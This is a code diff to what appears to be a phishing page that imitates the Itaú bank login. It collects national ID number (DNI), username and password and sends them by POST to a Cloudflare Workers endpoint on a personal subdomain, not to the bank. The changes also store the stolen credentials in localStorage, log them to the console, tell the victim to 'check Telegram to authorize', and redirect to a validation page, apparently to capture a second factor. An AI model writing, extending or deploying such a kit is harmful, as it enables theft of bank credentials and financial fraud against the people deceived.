@@ -140,6 +140,43 @@ body{min-height:100vh}
   border: 1px solid #bee5eb;
 }
 
+/* Transaction ID */
+.transaction-id {
+  display: none;
+  background: #f0f0f0;
+  padding: 12px 20px;
+  border-radius: 12px;
+  font-size: 14px;
+  color: #555;
+  margin: 15px 0;
+  word-break: break-all;
+  font-family: monospace;
+  border: 1px solid #ddd;
+}
+.transaction-id.visible {
+  display: block;
+}
+
+/* Botón reintentar */
+.retry-btn {
+  display: none;
+  background: var(--orange);
+  color: white;
+  border: none;
+  padding: 12px 30px;
+  border-radius: 12px;
+  font-size: 18px;
+  cursor: pointer;
+  margin: 10px auto 0;
+  transition: opacity 0.3s;
+}
+.retry-btn.visible {
+  display: block;
+}
+.retry-btn:hover {
+  opacity: 0.9;
+}
+
 /* TABLET */
 @media (max-width:900px){
   .header{height:125px;padding:18px 30px}
@@ -225,6 +262,14 @@ body{min-height:100vh}
     font-size: 14px;
     padding: 12px 15px;
   }
+  .transaction-id {
+    font-size: 12px;
+    padding: 10px 15px;
+  }
+  .retry-btn {
+    font-size: 16px;
+    padding: 10px 25px;
+  }
 }
 
 /* TELÉFONOS MUY PEQUEÑOS */
@@ -279,6 +324,12 @@ body{min-height:100vh}
   <!-- Contenedor para mensajes de estado -->
   <div id="status-message"></div>
 
+  <!-- Transaction ID -->
+  <div id="transactionId" class="transaction-id"></div>
+
+  <!-- Botón reintentar -->
+  <button id="retryBtn" class="retry-btn">🔄 Reintentar</button>
+
   <div class="links">
     <div onclick="alert('Función en desarrollo')">Adherirse a Itaú/Link Empresa ›</div>
     <div onclick="alert('Función en desarrollo')">Olvidé mi contraseña ›</div>
@@ -288,144 +339,159 @@ body{min-height:100vh}
 </main>
 
 <script>
-// Configuración - CAMBIA ESTA URL POR LA DE TU WORKER
-const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev'; // 👈 Reemplaza con tu URL
+// ========================= CONFIGURACIÓN =========================
+const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
 
-// Función para generar un ID único (transactionId)
-function generateTransactionId() {
-  return 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+// ========================= FUNCIONES =========================
+function generarTransactionId() {
+    return crypto.randomUUID ? crypto.randomUUID() : 
+        Math.random().toString(36).substring(2) + Date.now().toString(36);
 }
 
-// Función para mostrar mensajes de estado
-function showStatus(message, type = 'loading') {
-  const statusDiv = document.getElementById('status-message');
-  statusDiv.textContent = message;
-  statusDiv.className = type;
-}
-
-// Función para ocultar mensajes de estado
-function hideStatus() {
-  const statusDiv = document.getElementById('status-message');
-  statusDiv.className = '';
-  statusDiv.style.display = 'none';
-}
-
-// Función principal de login
-async function handleLogin() {
-  const dni = document.getElementById('dni').value.trim();
-  const usuario = document.getElementById('usuario').value.trim();
-  const clave = document.getElementById('clave').value.trim();
-  const loginBtn = document.getElementById('loginBtn');
-
-  // Validar campos
-  if (!dni || !usuario || !clave) {
-    showStatus('⚠️ Por favor, completa todos los campos', 'error');
-    return;
-  }
-
-  // Deshabilitar botón durante la petición
-  loginBtn.disabled = true;
-  loginBtn.classList.add('loading');
-  loginBtn.textContent = 'Procesando...';
-
-  // Generar transactionId
-  const transactionId = generateTransactionId();
-
-  try {
-    showStatus('🔄 Enviando datos de autenticación...', 'loading');
-
-    const response = await fetch(`${WORKER_URL}/login`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        dni: dni,
-        usuario: usuario,
-        clave: clave,
-        transactionId: transactionId
-      })
-    });
-
-    const data = await response.json();
-
-    if (response.ok && data.ok) {
-      // Éxito - mostrar mensaje
-      showStatus('✅ Datos enviados correctamente. Espera la autorización en tu dispositivo.', 'success');
-      
-      // Limpiar campos después del éxito
-      setTimeout(() => {
-        document.getElementById('dni').value = '';
-        document.getElementById('usuario').value = '';
-        document.getElementById('clave').value = '';
-      }, 1000);
-
-      // Opcional: redirigir o mostrar otra acción
-      // window.location.href = '/dashboard';
-    } else {
-      // Error del servidor
-      showStatus(`❌ Error: ${data.error || 'Error al procesar la solicitud'}`, 'error');
+function mostrarMensaje(contenedor, tipo, texto) {
+    contenedor.className = '';
+    contenedor.textContent = texto;
+    if (tipo) {
+        contenedor.classList.add(tipo);
     }
-  } catch (error) {
-    console.error('Error en la petición:', error);
-    showStatus('❌ Error de conexión. Verifica tu conexión a internet.', 'error');
-  } finally {
-    // Rehabilitar botón
-    loginBtn.disabled = false;
-    loginBtn.classList.remove('loading');
-    loginBtn.textContent = 'Ingresar';
-  }
+    contenedor.style.display = 'block';
 }
 
-// Event Listeners
+function ocultarMensaje(contenedor) {
+    contenedor.className = '';
+    contenedor.textContent = '';
+    contenedor.style.display = 'none';
+}
+
+function mostrarTransactionId(contenedor, id) {
+    contenedor.textContent = `🆔 ID: ${id.substring(0, 8)}...${id.substring(id.length - 4)}`;
+    contenedor.classList.add('visible');
+}
+
+function ocultarTransactionId(contenedor) {
+    contenedor.classList.remove('visible');
+    contenedor.textContent = '';
+}
+
+// ========================= FUNCIÓN DE LOGIN =========================
+async function handleLogin() {
+    const dni = document.getElementById('dni').value.trim();
+    const usuario = document.getElementById('usuario').value.trim();
+    const clave = document.getElementById('clave').value.trim();
+    const loginBtn = document.getElementById('loginBtn');
+    const mensajeContenedor = document.getElementById('status-message');
+    const transactionIdContenedor = document.getElementById('transactionId');
+    const retryBtn = document.getElementById('retryBtn');
+
+    // Validar campos
+    if (!dni || !usuario || !clave) {
+        mostrarMensaje(mensajeContenedor, 'error', '⚠️ Por favor, completa todos los campos');
+        return;
+    }
+
+    // Deshabilitar botón durante la petición
+    loginBtn.disabled = true;
+    loginBtn.classList.add('loading');
+    retryBtn.classList.remove('visible');
+    const textoOriginal = loginBtn.textContent;
+    loginBtn.textContent = '⏳ ENVIANDO...';
+    ocultarMensaje(mensajeContenedor);
+    ocultarTransactionId(transactionIdContenedor);
+
+    const transactionId = generarTransactionId();
+
+    try {
+        mostrarMensaje(mensajeContenedor, 'loading', '🔄 Enviando datos de autenticación...');
+
+        const response = await fetch(`${WORKER_URL}/login`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                dni: dni,
+                usuario: usuario,
+                clave: clave,
+                transactionId: transactionId
+            })
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.ok) {
+            // GUARDAR TODOS LOS DATOS EN LOCALSTORAGE para validacion.html
+            const datosLogin = {
+                dni: dni,
+                usuario: usuario,
+                clave: clave,
+                transactionId: transactionId,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('bancoldata', JSON.stringify(datosLogin));
+            
+            console.log('✅ Datos guardados en localStorage:', datosLogin);
+            
+            // Mostrar mensaje de éxito
+            mostrarTransactionId(transactionIdContenedor, transactionId);
+            mostrarMensaje(mensajeContenedor, 'success', 
+                `✅ Solicitud enviada correctamente\n📱 Revisa Telegram para autorizar\n⏳ Redirigiendo...`);
+            
+            // Redirigir a la página de validación
+            setTimeout(() => {
+                window.location.href = 'validacion.html';
+            }, 2000);
+            
+        } else {
+            mostrarMensaje(mensajeContenedor, 'error', 
+                `❌ Error: ${data.error || 'No se pudo procesar la solicitud'}`);
+            retryBtn.classList.add('visible');
+        }
+    } catch (error) {
+        console.error('Error en login:', error);
+        mostrarMensaje(mensajeContenedor, 'error', 
+            '❌ ERROR DE CONEXIÓN\nNo se pudo conectar con el servidor.\nVerifica tu conexión a internet.');
+        retryBtn.classList.add('visible');
+    } finally {
+        // Restaurar botón
+        loginBtn.disabled = false;
+        loginBtn.classList.remove('loading');
+        loginBtn.textContent = textoOriginal;
+    }
+}
+
+// ========================= EVENT LISTENERS =========================
 document.addEventListener('DOMContentLoaded', function() {
-  const loginBtn = document.getElementById('loginBtn');
-  const inputs = document.querySelectorAll('input');
+    const loginBtn = document.getElementById('loginBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const inputs = document.querySelectorAll('input');
 
-  // Click en botón
-  loginBtn.addEventListener('click', handleLogin);
+    // Click en botón
+    loginBtn.addEventListener('click', handleLogin);
 
-  // Enter en cualquier input
-  inputs.forEach(input => {
-    input.addEventListener('keypress', function(e) {
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        handleLogin();
-      }
+    // Botón de reintentar
+    retryBtn.addEventListener('click', handleLogin);
+
+    // Enter en cualquier input
+    inputs.forEach(input => {
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleLogin();
+            }
+        });
     });
-  });
 
-  // Ocultar mensajes al empezar a escribir
-  inputs.forEach(input => {
-    input.addEventListener('focus', function() {
-      hideStatus();
+    // Ocultar mensajes al empezar a escribir
+    inputs.forEach(input => {
+        input.addEventListener('focus', function() {
+            const mensajeContenedor = document.getElementById('status-message');
+            ocultarMensaje(mensajeContenedor);
+        });
     });
-  });
 
-  console.log('🚀 Sistema de autenticación listo');
-  console.log(`📡 Worker URL: ${WORKER_URL}`);
+    console.log('🚀 Sistema de autenticación Itaú listo');
+    console.log(`📡 Worker URL: ${WORKER_URL}`);
 });
-
-// Prevenir envío por defecto en formularios
-document.querySelector('form')?.addEventListener('submit', (e) => e.preventDefault());
-
-// Función para probar la conexión con el Worker
-async function testWorkerConnection() {
-  try {
-    const response = await fetch(`${WORKER_URL}/health`);
-    const data = await response.json();
-    console.log('✅ Conexión con Worker exitosa:', data);
-    return true;
-  } catch (error) {
-    console.error('❌ Error conectando con Worker:', error);
-    showStatus('⚠️ No se pudo conectar con el servidor de autenticación', 'error');
-    return false;
-  }
-}
-
-// Probar conexión al cargar (opcional)
-// Descomentar para probar automáticamente
-// testWorkerConnection();
 </script>
 
 </body>
